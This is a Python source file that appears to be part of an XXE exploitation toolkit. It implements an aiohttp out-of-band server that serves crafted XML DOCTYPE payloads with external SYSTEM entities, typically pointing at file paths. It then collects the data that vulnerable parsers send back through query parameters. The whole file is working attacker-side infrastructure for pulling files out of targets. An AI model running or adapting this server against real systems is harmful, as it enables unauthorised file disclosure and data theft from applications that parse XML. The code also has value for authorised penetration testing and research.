import asyncio
import random
import email
from urllib import parse

from aiohttp import server
import aiohttp


class OOBHttpRequestHandler(server.ServerHttpProtocol):
    TEST_RESPONSE = random.randint(1, 150)

    def handle_request(self, message, payload):
        headers = email.message.Message()
        for hdr, val in message.headers.items():
            headers.add_header(hdr, val)

        response = aiohttp.Response(
            self.writer, 200, http_version=message.version
        )
        response.add_header('Transfer-Encoding', 'chunked')

        accept_encoding = headers.get('accept-encoding', '').lower()

        if 'deflate' in accept_encoding:
            response.add_header('Content-Encoding', 'deflate')
            response.add_compression_filter('deflate')

        elif 'gzip' in accept_encoding:
            response.add_header('Content-Encoding', 'gzip')
            response.add_compression_filter('gzip')

        response.add_chunking_filter(1025)
        response.add_header('Content-type', 'text/xml')

        response.send_headers()
        parsed = parse.urlparse(message.path)
        parsed_data = parse.parse_qs(parsed.query)

        if message.path.startswith("/entity/"):
            file_id = message.path.replace("/entity/", "")
            use_comment = False
            if file_id == "test":
                entity_value = '"{}"'.format(self.TEST_RESPONSE)
            elif self.server.expecting_identifier(file_id):
                use_comment, value = self.server.get_entity_value(file_id)
                entity_value = 'SYSTEM "{}"'.format(value)
            else:
                return response.force_close()

            data_value = "&c;"
            if use_comment:
                data_value = "<!-- {} -->".format(data_value)

            response.write(bytes("""<!DOCTYPE stuff [
             <!ELEMENT data ANY>
             <!ENTITY c {}>
             ]>
             <data>{}</data>""".format(entity_value, data_value), "utf-8"))
        elif message.path == "/test":
            response.write(bytes("<test>{}</test>".format(self.TEST_RESPONSE), "utf8"))
        else:
            identifier = parsed.path.lstrip("/")
            if not self.server.expecting_identifier(identifier):
                return response.force_close()
            if "d" not in parsed_data:
                parsed_data["d"] = []

            self.server.got_data(identifier, parsed_data)

            response.write(bytes("<test>{}</test>".format(identifier), "utf-8"))
        #else:
        #    response.write(bytes("Begone!"))

        yield from response.write_eof()
        if response.keep_alive():
            self.keep_alive(True)


class OOBHttpServer(object):
    expectations = {}
    serve_files = {}

    _lock = asyncio.Lock()

    def __init__(self, host=None, port=None):
        self.tick = 0
        self.server = None
        self.external_ip, self.port = host, port

    def create_handler(self, *args, **kwargs):
        h = OOBHttpRequestHandler(keep_alive=75)
        h.server = self
        return h

    def expecting_identifier(self, identifier):
        return identifier in self.expectations

    def get_entity_value(self, id):
        return self.serve_files[id]

    def expect_entity_injection(self, entity_value, use_comment=False):
        """
        Expect a HTTP request and serve crafted XML entity
        :param entity_value: the value of the entity. Normally a file path
        :param use_comment: If True the entity will be inside a comment
        :return: a tuple of an ID and a future
        """
        tick, future = self.expect_data()
        self.serve_files[tick] = (use_comment, entity_value)
        return tick, future

    def expect_data(self):
        self.tick += 1
        future = asyncio.Future()
        self.expectations[str(self.tick)] = future
        return str(self.tick), future

    def got_data(self, id, data):
        self.expectations[id].set_result(data)
        del self.expectations[id]

    @asyncio.coroutine
    def start(self, port=None):
        with (yield from self._lock):
            print("Listening on {}".format(self.port))
            if self.server is not None:
                return #raise RuntimeError("Server has already been started")

            if port:
                self.port = port

            loop = asyncio.get_event_loop()
            self.server = yield from loop.create_server(
                self.create_handler,
                "0.0.0.0", self.port
            )

            if self.port == 0:
                self.port = self.server.sockets[0].getsockname()[1]

            return

    def stop(self):
        if self.server is None:
            return #raise RuntimeError("Server has not been started!")
        print("Stopping server")
        self.server.close()
        self.server = None

    @property
    def started(self):
        return self.server is not None

    @property
    def location(self):
        return "http://{}:{}".format(self.external_ip, self.port)

default = OOBHttpServer()